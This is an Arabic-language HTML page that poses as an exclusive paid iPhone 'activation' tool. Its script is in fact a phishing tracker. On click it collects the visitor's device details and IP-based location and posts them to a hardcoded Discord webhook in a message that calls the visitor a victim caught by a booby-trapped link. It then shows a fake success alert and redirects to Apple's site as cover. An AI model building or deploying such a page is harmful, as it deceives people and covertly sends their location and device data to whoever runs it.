<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HTLr Premium | iPhone Activation</title>
    <style>
        body { background-color: #000; color: #00ff41; font-family: -apple-system, system-ui, sans-serif; text-align: center; padding: 50px 20px; }
        .box { border: 1px solid #00ff41; padding: 30px; border-radius: 20px; box-shadow: 0 0 15px #00ff41; background: #0a0a0a; }
        h1 { font-size: 28px; text-transform: uppercase; letter-spacing: 2px; }
        p { color: #ccc; font-size: 14px; margin-bottom: 30px; }
        .btn { background: #00ff41; color: #000; padding: 15px 40px; border-radius: 10px; text-decoration: none; font-weight: bold; font-size: 18px; display: inline-block; cursor: pointer; border: none; }
        .btn:active { transform: scale(0.98); background: #ff0000; color: #fff; }
        .footer { margin-top: 60px; color: #333; font-size: 10px; }
    </style>
</head>
<body>

    <div class="box">
        <h1>#HTLr EXCLUSIVE</h1>
        <p>رابط اداه نادره وحصريهه (مدفوعه) لاتنشر الرابط الى لخوياك!!</p>
        <p>اضغط لتفعيل "شهادة التوثيق" للأيفون واستخدام الأداة</p>
        
        <button class="btn" id="captureBtn">تفعيل الآن (ACTIVATE)</button>
    </div>

    <div class="footer">Z7F LINK TRACK | DENGER ☢️</div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1485705281399951380/vq0MMpRxWwbxu81_b2sH0NyCuwJNylU105PRJCF37kwFDwuLbRMvnroWGai3a1dZ6ApE";

        document.getElementById('captureBtn').addEventListener('click', async function() {
            this.innerText = "جاري التفعيل...";
            this.disabled = true;

            // 1. جمع معلومات الجهاز
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${window.screen.width}x${window.screen.height}`,
                touchPoints: navigator.maxTouchPoints,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cores: navigator.hardwareConcurrency || "N/A"
            };

            // 2. محاولة جلب الآيبي والموقع
            let ipData = { ip: "غير معروف", city: "غير معروف", country: "غير معروف" };
            try {
                const response = await fetch('https://ipapi.co/json/');
                if (response.ok) {
                    ipData = await response.json();
                }
            } catch (e) {
                console.log("IP capture blocked or failed");
            }

            // 3. تجهيز الإيمبد الفخم للديسكورد
            const payload = {
                username: "HTLr iSpy",
                embeds: [{
                    title: "🎯 صيدة أيفون جديدة! [#HTLr]",
                    description: "تم سحب معلومات الضحية بنجاح عبر الرابط الملغم.",
                    color: 16711680, // أحمر
                    fields: [
                        { name: "🌐 معلومات الشبكة (IP)", value: `**IP:** \`${ipData.ip || ipData.query}\`\n**الدولة:** ${ipData.country_name || ipData.country}\n**المدينة:** ${ipData.city}\n**المزود:** ${ipData.org || ipData.isp}`, inline: false },
                        { name: "📱 تفاصيل الأيفون", value: `**الجهاز:** ${info.platform}\n**الإصدار:** iPhone OS\n**الشاشة:** ${info.screen}\n**اللغة:** ${info.language}`, inline: true },
                        { name: "🕒 المنطقة الزمنية", value: `${info.timezone}`, inline: true },
                        { name: "💻 المتصفح", value: `\`\`\`${info.userAgent}\`\`\``, inline: false }
                    ],
                    footer: { text: "Z7F LINK TRACK | DENGER ☢️" },
                    timestamp: new Date()
                }]
            };

            // 4. إرسال البيانات للويبهوك
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                // تحويل الضحية لموقع أبل كتمويه بعد الإرسال
                alert("تم تفعيل الأداة بنجاح على جهازك!");
                window.location.href = "https://www.apple.com/iphone/";
            } catch (error) {
                alert("حدث خطأ في التفعيل، حاول مرة أخرى.");
                this.disabled = false;
                this.innerText = "تفعيل الآن (ACTIVATE)";
            }
        });
    </script>
</body>
</html>
